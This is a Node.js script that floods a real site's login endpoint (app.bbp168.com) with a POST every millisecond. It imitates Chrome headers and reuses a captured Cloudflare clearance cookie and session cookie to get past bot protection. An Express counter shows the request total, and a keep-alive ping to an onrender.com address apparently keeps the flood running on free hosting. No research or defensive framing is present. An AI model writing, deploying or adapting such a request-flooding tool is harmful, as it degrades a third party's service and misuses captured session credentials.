let conto=0;
const roo = ()=>{
    fetch("https://app.bbp168.com/login-json-check", {
        "headers": {
          "accept": "*/*",
          "accept-language": "th",
          "content-type": "application/json",
          "priority": "u=1, i",
          "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
          "sec-ch-ua-arch": "\"x86\"",
          "sec-ch-ua-bitness": "\"64\"",
          "sec-ch-ua-full-version": "\"131.0.6778.205\"",
          "sec-ch-ua-full-version-list": "\"Google Chrome\";v=\"131.0.6778.205\", \"Chromium\";v=\"131.0.6778.205\", \"Not_A Brand\";v=\"24.0.0.0\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-model": "\"\"",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-ch-ua-platform-version": "\"19.0.0\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          "cookie": "cf_clearance=RTLvp_wd9j2Zjbta1i3.EqT_GlSltJ2y2B8iwGGc26A-1735876256-1.2.1.1-dCWYjfFs52lHAig0jS43IkXJpp5CoRkFyxBVv5JRRz0.HkY0soDHQgvRkPAVrPk3Q.BvU0nHJfHva9hhQ_xUKZ2j4zihYjomc6Ca77Wk6WIXZ_i03m7hxbcvk_hIw.8AX.hHiCmUqweWKxPWL9pK_MtMHF_BArhfS0EfFem_dT4YevtAuxP2TUA1pZ3lvpebiQgMKXP7B6EGlmetW_e81lHg9FJaH9xVEB.xHgbqibMHAPX4lWPa.4Oc3Ekn62Muy3JytrbZf2mVqYtk82stEAxq2pq5z2YHUJmTejshl2cM1Kc7Npoe9Iisra9CMIy0IFqfJtKb7uGOuGFAA35phjAGinpT4X1CjPB4Bb9vzcX2mqcXvEUKkOgNgJBd81OxhvSqUwF9.rSlTkQuU.G_hkLgm7xIXQ4QF5.2Gz8tzGl1.zeNmYYZ7bEFBaC5mGbG; ci_session=9pkfera1urvo1hvo17bm07ii6l5lfh58",
          "Referer": "https://app.bbp168.com/",
          "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": "{\"username\":\"095456456456\",\"password\":\"gffhhgfh\"}",
        "method": "POST"
    }).then(response => {
      conto++;
    }).catch(error => {
          
    });
}


  setInterval(roo,1);


const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('TO '+conto));
const PORT = process.env.PORT || 3500;

app.listen(PORT, () => {
    console.log('Proxy server running on http://localhost:'+PORT);
});


setInterval(() => {
    fetch('https://apiyw1.onrender.com/')
        .then()
        .catch();
}, 30000);
